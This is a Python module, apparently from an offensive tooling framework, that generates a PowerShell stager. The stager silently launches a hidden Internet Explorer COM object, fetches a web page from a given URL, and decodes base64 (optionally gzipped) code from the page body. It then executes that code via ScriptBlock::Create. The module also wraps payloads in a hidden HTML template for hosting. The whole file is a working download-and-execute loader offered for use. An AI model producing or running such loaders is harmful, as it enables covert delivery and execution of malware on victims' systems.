from lets.__module__ import Module
import base64, gzip


class WebLoaderIE(Module):
    """
    Generate a PowerShell script that executes further PowerShell code
    from a web resource using an Internet Explorer COM object.

    NOTE: Web resource must be wrapped in `<html><body>[DATA]</body></html>`
    """
    
    @classmethod
    def add_arguments(self, parser):
        parser.add_argument("url", type=str, nargs="?",
            help="url of web resource")
        parser.add_argument("-z", "--decompress", action="store_true",
            help="payload is gzipped")

    def handle(self, input, url=None, decompress=False):

        # Encode input to be compatible with loader
        if input is not None:
            self.log.debug("Wrapping input data in web template")

            # Generate web template
            template = b"""
<html>
<head>
</head>
<body style="display:none">%s</body>
</html>
"""

            for data in input:

                # Optionally compress data
                if decompress:
                    data = gzip.compress(data, compresslevel=9)

                # Wrap data in template
                encoded = base64.b64encode(data)
                yield template % encoded

        # Generate loader
        else:
            assert url is not None, "must provide argument: `url`"

            com  =  "$ie = New-Object -COM InternetExplorer.Application;"
            com +=  "$ie.Silent=$True;"
            com +=  "$ie.Visible=$False;"
            com +=  "$ie.Navigate2('%s',14,0,$Null,$Null);" % url
            com +=  "While($ie.busy){"
            com +=      "Start-Sleep -Milliseconds 100;"
            com +=  "};"
            com +=  "$ie.Document.GetType().InvokeMember("
            com +=      "'body',[System.Reflection.BindingFlags]::GetProperty,$Null,$ie.Document,$Null"
            com +=  ").InnerHtml"

            if decompress:
                cmd  =  "&([ScriptBlock]::Create("
                cmd +=      "(New-Object System.IO.StreamReader("
                cmd +=          "New-Object System.IO.Compression.GzipStream("
                cmd +=              "(New-Object System.IO.MemoryStream(,"
                cmd +=                  "[System.Convert]::FromBase64String("
                cmd +=                      "$(%s)" % com
                cmd +=                  ")"
                cmd +=              ")),[System.IO.Compression.CompressionMode]::Decompress"
                cmd +=          ")"
                cmd +=      ")).ReadToEnd()"
                cmd +=  "))"

            else:
                cmd  =  "&([ScriptBlock]::Create("
                cmd +=      "[System.Text.Encoding]::Ascii.GetString("
                cmd +=          "[System.Convert]::FromBase64String("
                cmd +=              "$(%s)" % com
                cmd +=          ")"
                cmd +=      ")"
                cmd +=  "))"
            
            self.log.warning("Web resource must be wrapped in `<html><body>[DATA]</body></html>`!")
            yield cmd.encode()
